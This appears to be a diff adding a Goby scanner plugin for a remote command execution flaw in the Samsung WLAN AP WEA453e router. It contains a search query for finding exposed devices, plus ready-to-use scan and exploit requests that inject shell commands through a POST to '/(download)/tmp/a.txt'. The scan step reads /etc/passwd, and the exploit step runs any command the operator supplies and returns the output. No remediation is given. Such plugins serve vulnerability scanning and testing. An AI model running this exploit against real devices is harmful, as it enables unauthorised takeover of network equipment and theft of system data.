@@ -1,0 +1,82 @@
+{
+      "Name": "Samsung WLAN AP wea453e router RCE",
+      "Level": "3",
+      "Tags": [
+            "RCE"
+      ],
+      "GobyQuery": "app=\"Chunjs-server\" && body=\"Samsung Electronics\"",
+      "Description": "Samsung WLAN AP wea453e router has a remote command execution vulnerability. It can execute arbitrary commands without authorization to obtain server permissions",
+      "Product": "Samsung WLAN AP wea453e router",
+      "Homepage": "https://www.samsung.com/cn/",
+      "Author": "PeiQi",
+      "Impact": "<p>Execute any command to get the server permission<br></p>",
+      "Recommandation": "",
+      "References": [
+            "http://wiki.peiqi.tech"
+      ],
+      "HasExp": true,
+	  "ExpParams": [
+		{
+			"name": "Cmd",
+			"type": "input",
+			"value": "cat /etc/passwd",
+			"show": ""
+		}
+	  ],
+      "ScanSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/(download)/tmp/a.txt",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "command1=shell:cat /etc/passwd| dd of=/tmp/a.txt"
+                  },
+                  "ResponseTest": {
+                        "type": "group",
+                        "operation": "AND",
+                        "checks": [
+                              {
+                                    "type": "item",
+                                    "variable": "$code",
+                                    "operation": "==",
+                                    "value": "200",
+                                    "bz": ""
+                              },
+                              {
+                                    "type": "item",
+                                    "variable": "$body",
+                                    "operation": "contains",
+                                    "value": "root",
+                                    "bz": ""
+                              }
+                        ]
+                  },
+                  "SetVariable": []
+            }
+      ],
+	  "ExploitSteps": [
+            "AND",
+            {
+                  "Request": {
+                        "method": "POST",
+                        "uri": "/(download)/tmp/a.txt",
+                        "follow_redirect": false,
+                        "header": {
+                              "Content-Type": "application/json;charset=UTF-8"
+                        },
+                        "data_type": "text",
+                        "data": "command1=shell:{{{Cmd}}}| dd of=/tmp/a.txt"
+                  },
+                  "SetVariable": [
+					"output|lastbody"
+				  ]
+            }
+      ],
+      "PostTime": "2021-04-04 23:47:22",
+      "GobyVersion": "1.8.255"
+}
